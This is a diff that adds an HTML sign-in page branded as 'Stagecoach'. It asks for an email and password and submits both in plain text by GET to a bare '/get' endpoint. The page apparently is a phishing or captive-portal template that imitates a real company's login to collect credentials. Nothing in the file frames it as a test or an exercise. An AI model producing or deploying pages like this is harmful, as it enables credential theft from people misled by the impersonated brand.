@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+        }
+        .container {
+            max-width: 400px;
+            padding: 25px;
+            margin: auto;
+        }
+        .form {
+            max-width: 300px;
+            padding: 20px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            margin: 0 auto;
+            background: white;
+        }
+        h1 {
+            text-align: center;
+            color: #E65C00;
+            font-size: 22px;
+            margin: 15px 0 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+        }
+        button[type="submit"] {
+            width: 100%;
+            background-color: #E65C00;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button[type="submit"]:hover {
+            background-color: #C44F00;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo-circle {
+            width: 60px;
+            height: 60px;
+            background: #E65C00;
+            border-radius: 50%;
+            display: inline-block;
+            margin-bottom: 8px;
+        }
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #E65C00;
+            letter-spacing: -0.5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-circle"></div>
+            <div class="logo-text">Stagecoach</div>
+        </div>
+        <form action="/get" method="get" id="email-form-step" class="form">
+            <h1>Sign In with<br>your Stagecoach account</h1>
+            <input name="email" type="text" placeholder="Email" required>
+            <input name="password" type="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+</body>
+</html>
